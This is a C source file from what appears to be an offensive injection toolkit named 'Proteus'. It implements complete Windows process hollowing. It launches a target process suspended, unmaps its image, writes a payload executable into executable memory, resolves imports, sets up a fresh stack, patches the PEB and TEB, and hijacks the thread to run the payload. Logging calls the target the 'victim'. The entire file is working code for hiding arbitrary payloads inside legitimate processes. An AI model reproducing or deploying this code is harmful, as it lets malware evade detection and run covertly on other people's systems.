/* ============================================================================
 * Proteus- Execution Engine -- process_hollowing.c
 * Process hollowing with fresh stack + TEB stack-limit fixup.
 * ============================================================================ */

#include "../include/injection.h"
#include "../include/pal.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32

#include <windows.h>
#include <winternl.h>
#include <psapi.h>

typedef LONG (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef LONG (NTAPI *pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
typedef LONG (NTAPI *pNtQueryInformationThread)(HANDLE, DWORD, PVOID, ULONG, PULONG);

static int fixup_teb(HANDLE hProcess, HANDLE hThread,
                     ULONG_PTR stack_base, ULONG_PTR stack_limit)
{
#ifdef _WIN64
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return -1;
    pNtQueryInformationThread NtQIT =
        (pNtQueryInformationThread)GetProcAddress(ntdll, "NtQueryInformationThread");
    if (!NtQIT) return -2;

    struct { LONG ExitStatus; PVOID TebBaseAddress; HANDLE UniqueProcess; HANDLE UniqueThread;
             PVOID AffinityMask; LONG Priority; LONG BasePriority; } tbi = {0};
    ULONG ret_len = 0;
    if (NtQIT(hThread, 0, &tbi, sizeof(tbi), &ret_len) != 0) return -3;

    ULONG_PTR teb = (ULONG_PTR)tbi.TebBaseAddress;
    if (!teb) return -4;

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, (LPVOID)(teb + 0x08),
                            &stack_base, sizeof(ULONG_PTR), &written)) return -5;
    if (!WriteProcessMemory(hProcess, (LPVOID)(teb + 0x10),
                            &stack_limit, sizeof(ULONG_PTR), &written)) return -6;
    if (!WriteProcessMemory(hProcess, (LPVOID)(teb + 0x1478),
                            &stack_base, sizeof(ULONG_PTR), &written)) return -7;
    return 0;
#else
    (void)hProcess; (void)hThread; (void)stack_base; (void)stack_limit;
    return -99;
#endif
}

#pragma pack(push, 1)
typedef struct { WORD e_magic, e_cblp, e_cp, e_crlc, e_cparhdr, e_minalloc, e_maxalloc,
                      e_ss, e_sp, e_csum, e_ip, e_cs, e_lfarlc, e_ovno, e_res[4],
                      e_oemid, e_oeminfo, e_res2[10]; LONG e_lfanew; } MY_DOS_HEADER, *PMY_DOS_HEADER;
typedef struct { WORD Machine, NumberOfSections; DWORD TimeDateStamp, PointerToSymbolTable,
                      NumberOfSymbols; WORD SizeOfOptionalHeader, Characteristics; } MY_FILE_HEADER, *PMY_FILE_HEADER;
typedef struct { DWORD VirtualAddress, Size; } MY_IMAGE_DATA_DIRECTORY, *PMY_IMAGE_DATA_DIRECTORY;

#ifdef _WIN64
typedef struct { WORD Magic; BYTE MajorLinkerVersion, MinorLinkerVersion; DWORD SizeOfCode,
                 SizeOfInitializedData, SizeOfUninitializedData, AddressOfEntryPoint, BaseOfCode;
                 ULONGLONG ImageBase; DWORD SectionAlignment, FileAlignment;
                 WORD MajorOperatingSystemVersion, MinorOperatingSystemVersion,
                      MajorImageVersion, MinorImageVersion, MajorSubsystemVersion, MinorSubsystemVersion;
                 DWORD Win32VersionValue, SizeOfImage, SizeOfHeaders, CheckSum; WORD Subsystem, DllCharacteristics;
                 ULONGLONG SizeOfStackReserve, SizeOfStackCommit, SizeOfHeapReserve, SizeOfHeapCommit;
                 DWORD LoaderFlags, NumberOfRvaAndSizes; MY_IMAGE_DATA_DIRECTORY DataDirectory[16]; } MY_OPTIONAL_HEADER, *PMY_OPTIONAL_HEADER;
#else
typedef struct { WORD Magic; BYTE MajorLinkerVersion, MinorLinkerVersion; DWORD SizeOfCode,
                 SizeOfInitializedData, SizeOfUninitializedData, AddressOfEntryPoint, BaseOfCode, BaseOfData,
                 ImageBase, SectionAlignment, FileAlignment;
                 WORD MajorOperatingSystemVersion, MinorOperatingSystemVersion,
                      MajorImageVersion, MinorImageVersion, MajorSubsystemVersion, MinorSubsystemVersion;
                 DWORD Win32VersionValue, SizeOfImage, SizeOfHeaders, CheckSum; WORD Subsystem, DllCharacteristics;
                 DWORD SizeOfStackReserve, SizeOfStackCommit, SizeOfHeapReserve, SizeOfHeapCommit,
                       LoaderFlags, NumberOfRvaAndSizes; MY_IMAGE_DATA_DIRECTORY DataDirectory[16]; } MY_OPTIONAL_HEADER, *PMY_OPTIONAL_HEADER;
#endif

typedef struct { DWORD Signature; MY_FILE_HEADER FileHeader; MY_OPTIONAL_HEADER OptionalHeader; } MY_NT_HEADERS, *PMY_NT_HEADERS;
typedef struct { BYTE Name[8]; union { DWORD PhysicalAddress, VirtualSize; } Misc;
                 DWORD VirtualAddress, SizeOfRawData, PointerToRawData, PointerToRelocations, PointerToLinenumbers;
                 WORD NumberOfRelocations, NumberOfLinenumbers; DWORD Characteristics; } MY_SECTION_HEADER, *PMY_SECTION_HEADER;
typedef struct { DWORD OriginalFirstThunk, TimeDateStamp, ForwarderChain, Name, FirstThunk; } MY_IMAGE_IMPORT_DESCRIPTOR, *PMY_IMAGE_IMPORT_DESCRIPTOR;
#pragma pack(pop)

#define MY_IMAGE_DOS_SIGNATURE          0x5A4D
#define MY_IMAGE_NT_SIGNATURE           0x00004550
#define MY_IMAGE_DIRECTORY_ENTRY_IMPORT 1

#define MY_IMAGE_FIRST_SECTION(nt) ((PMY_SECTION_HEADER)((BYTE*)(nt) + \
    sizeof(DWORD) + sizeof(MY_FILE_HEADER) + (nt)->FileHeader.SizeOfOptionalHeader))

static DWORD RvaToFileOffset(PMY_NT_HEADERS pNt, DWORD rva) {
    PMY_SECTION_HEADER pSection = MY_IMAGE_FIRST_SECTION(pNt);
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        DWORD start = pSection[i].VirtualAddress;
        DWORD end = start + pSection[i].Misc.VirtualSize;
        if (end < start) continue;
        if (rva >= start && rva < end) return pSection[i].PointerToRawData + (rva - start);
    }
    return 0;
}

static BOOL ResolveImportsEx(HANDLE hProcess, LPVOID remoteBase,
                             PMY_NT_HEADERS pNtHeaders, BYTE* pLocalBuffer) {
    DWORD importRVA = pNtHeaders->OptionalHeader.DataDirectory[MY_IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    DWORD importSize = pNtHeaders->OptionalHeader.DataDirectory[MY_IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
    if (importRVA == 0 || importSize == 0) { LOG_INFO("[DEBUG] No imports to resolve"); return TRUE; }
    DWORD importFileOffset = RvaToFileOffset(pNtHeaders, importRVA);
    if (importFileOffset == 0) { LOG_ERROR("[-] Failed to locate import directory"); return FALSE; }
    PMY_IMAGE_IMPORT_DESCRIPTOR pDesc = (PMY_IMAGE_IMPORT_DESCRIPTOR)(pLocalBuffer + importFileOffset);
#ifdef _WIN64
    typedef ULONGLONG MY_THUNK;
#else
    typedef DWORD MY_THUNK;
#endif
    while (pDesc->Name != 0) {
        DWORD nameFileOffset = RvaToFileOffset(pNtHeaders, pDesc->Name);
        if (nameFileOffset == 0) return FALSE;
        char* dllName = (char*)(pLocalBuffer + nameFileOffset);
        HMODULE hDll = GetModuleHandleA(dllName);
        if (!hDll) hDll = LoadLibraryA(dllName);
        if (!hDll) return FALSE;
        DWORD origThunkRVA = pDesc->OriginalFirstThunk;
        DWORD firstThunkRVA = pDesc->FirstThunk;
        if (origThunkRVA == 0) origThunkRVA = firstThunkRVA;
        DWORD thunkFileOffset = RvaToFileOffset(pNtHeaders, origThunkRVA);
        if (thunkFileOffset == 0) return FALSE;
        MY_THUNK* pThunk = (MY_THUNK*)(pLocalBuffer + thunkFileOffset);
        int thunkIndex = 0;
        while (*pThunk != 0) {
            MY_THUNK thunkValue = *pThunk;
            FARPROC func = NULL;
            if (thunkValue & (sizeof(MY_THUNK) == 8 ? 0x8000000000000000ULL : 0x80000000UL)) {
                func = GetProcAddress(hDll, (LPCSTR)(ULONG_PTR)(thunkValue & 0xFFFF));
            } else {
                DWORD nameFileOffset2 = RvaToFileOffset(pNtHeaders, (DWORD)thunkValue);
                if (nameFileOffset2 == 0) return FALSE;
                func = GetProcAddress(hDll, (char*)(pLocalBuffer + nameFileOffset2 + 2));
            }
            if (!func) return FALSE;
            LPVOID iatAddr = (BYTE*)remoteBase + firstThunkRVA + (thunkIndex * sizeof(MY_THUNK));
            if (!WriteProcessMemory(hProcess, iatAddr, &func, sizeof(MY_THUNK), NULL)) return FALSE;
            pThunk++; thunkIndex++;
        }
        pDesc++;
    }
    LOG_INFO("[+] Imports resolved");
    return TRUE;
}

static DWORD MapSectionProtection(DWORD characteristics) {
    if (characteristics & 0x20000000) {
        if (characteristics & 0x40000000) return PAGE_EXECUTE_READ;
        if (characteristics & 0x80000000) return PAGE_EXECUTE_READWRITE;
        return PAGE_EXECUTE;
    }
    if (characteristics & 0x40000000) {
        if (characteristics & 0x80000000) return PAGE_READWRITE;
        return PAGE_READONLY;
    }
    if (characteristics & 0x80000000) return PAGE_READWRITE;
    return PAGE_READONLY;
}

int perform_process_hollowing(InjectionConfig* config) {
    if (!config || !config->payload || config->payloadSize == 0) return -1;

    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0}; si.cb = sizeof(si);
    if (!CreateProcessA(NULL, (LPSTR)config->targetImage, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        LOG_ERROR("[-] CreateProcess failed: %lu", GetLastError());
        return -1;
    }
    LOG_INFO("[+] Victim PID: %lu", pi.dwProcessId);

    BYTE* pLocalBuffer = (BYTE*)config->payload;
    PMY_DOS_HEADER pDos = (PMY_DOS_HEADER)pLocalBuffer;
    if (pDos->e_magic != MY_IMAGE_DOS_SIGNATURE) { LOG_ERROR("[-] Invalid DOS header"); goto fail_early; }
    PMY_NT_HEADERS pNt = (PMY_NT_HEADERS)(pLocalBuffer + pDos->e_lfanew);
    if (pNt->Signature != MY_IMAGE_NT_SIGNATURE) { LOG_ERROR("[-] Invalid NT header"); goto fail_early; }

    SIZE_T newImageSize = pNt->OptionalHeader.SizeOfImage;
    LPVOID preferredBase = (LPVOID)(uintptr_t)pNt->OptionalHeader.ImageBase;
    LOG_INFO("[+] New PE: Base=%p, Size=0x%zX", preferredBase, newImageSize);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    pNtUnmapViewOfSection NtUnmap = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    if (!NtQIP || !NtUnmap) goto fail_early;

    typedef struct { LONG ExitStatus; PVOID PebBaseAddress; ULONG_PTR AffinityMask; LONG BasePriority;
                     ULONG_PTR UniqueProcessId, InheritedFromUniqueProcessId; } MY_PBI;
    MY_PBI pbi = {0}; ULONG returnLength = 0;
    if (NtQIP(pi.hProcess, 0, &pbi, sizeof(pbi), &returnLength) < 0) goto fail_early;

    LPVOID oldImageBase = NULL; SIZE_T bytesReadMem = 0;
#ifdef _WIN64
    BYTE* remotePebImageBase = (BYTE*)pbi.PebBaseAddress + 0x10;
#else
    BYTE* remotePebImageBase = (BYTE*)pbi.PebBaseAddress + 0x08;
#endif
    if (!ReadProcessMemory(pi.hProcess, remotePebImageBase, &oldImageBase, sizeof(PVOID), &bytesReadMem))
        goto fail_early;
    LOG_INFO("[+] Old ImageBase: %p", oldImageBase);

    NtUnmap(pi.hProcess, oldImageBase);
    LOG_INFO("[+] Original image unmapped");

    LPVOID remoteBase = VirtualAllocEx(pi.hProcess, preferredBase, newImageSize,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBase) {
        remoteBase = VirtualAllocEx(pi.hProcess, NULL, newImageSize,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteBase) goto fail_early;
    }
    LOG_INFO("[+] Allocated at %s: %p", remoteBase == preferredBase ? "preferred" : "fallback", remoteBase);

    WriteProcessMemory(pi.hProcess, remotePebImageBase, &remoteBase, sizeof(PVOID), NULL);
    LOG_INFO("[+] PEB ImageBase updated");

    WriteProcessMemory(pi.hProcess, remoteBase, pLocalBuffer, pDos->e_lfanew, NULL);
    LPVOID remoteNt = (BYTE*)remoteBase + pDos->e_lfanew;
    DWORD ntSize = sizeof(DWORD) + sizeof(MY_FILE_HEADER) + pNt->FileHeader.SizeOfOptionalHeader;
    WriteProcessMemory(pi.hProcess, remoteNt, pLocalBuffer + pDos->e_lfanew, ntSize, NULL);

    PMY_SECTION_HEADER pSection = MY_IMAGE_FIRST_SECTION(pNt);
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSection[i].SizeOfRawData > 0) {
            LPVOID dest = (BYTE*)remoteBase + pSection[i].VirtualAddress;
            LPVOID src = pLocalBuffer + pSection[i].PointerToRawData;
            if (!WriteProcessMemory(pi.hProcess, dest, src, pSection[i].SizeOfRawData, NULL)) {
                LOG_ERROR("[-] Write section [%s] failed", pSection[i].Name);
                goto fail;
            }
        }
    }

    if (!ResolveImportsEx(pi.hProcess, remoteBase, pNt, pLocalBuffer)) goto fail;

    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        LPVOID secBase = (BYTE*)remoteBase + pSection[i].VirtualAddress;
        SIZE_T secSize = pSection[i].Misc.VirtualSize ? pSection[i].Misc.VirtualSize : pSection[i].SizeOfRawData;
        DWORD oldProt = 0;
        VirtualProtectEx(pi.hProcess, secBase, secSize, MapSectionProtection(pSection[i].Characteristics), &oldProt);
    }
    LOG_INFO("[+] Section protections applied");

    DWORD entryRVA = pNt->OptionalHeader.AddressOfEntryPoint;
    LPVOID entry = (BYTE*)remoteBase + entryRVA;

    SIZE_T stackSize = 0x100000;
    LPVOID remoteStack = VirtualAllocEx(pi.hProcess, NULL, stackSize,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteStack) { LOG_ERROR("[-] stack alloc failed: %lu", GetLastError()); goto fail; }

    ULONG_PTR stackTop = ((ULONG_PTR)remoteStack + stackSize) & ~(ULONG_PTR)0xF;
    stackTop -= 8;

    LPVOID pExitProcess = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ExitProcess");
    WriteProcessMemory(pi.hProcess, (LPVOID)stackTop, &pExitProcess, sizeof(pExitProcess), NULL);

    CONTEXT ctx = {0}; ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) goto fail;
#ifdef _WIN64
    ctx.Rsp = (DWORD64)stackTop;
    ctx.Rip = (DWORD64)entry;
#else
    ctx.Esp = (DWORD)stackTop;
    ctx.Eip = (DWORD)entry;
#endif
    if (!SetThreadContext(pi.hThread, &ctx)) goto fail;

    int fix_rc = fixup_teb(pi.hProcess, pi.hThread,
                           (ULONG_PTR)remoteStack + stackSize,
                           (ULONG_PTR)remoteStack);
    LOG_INFO("[%s] TEB stack fixup rc=%d", fix_rc == 0 ? "+" : "-", fix_rc);

    LOG_INFO("[+] New stack %p RSP %p entry %p", remoteStack, (void*)stackTop, entry);

    ResumeThread(pi.hThread);
    LOG_INFO("[+] Thread resumed! Process hollowed successfully.");
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    return 0;

fail:
    TerminateProcess(pi.hProcess, 1);
fail_early:
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    return -1;
}

#else
int perform_process_hollowing(InjectionConfig* config) { (void)config; return -1; }
#endif
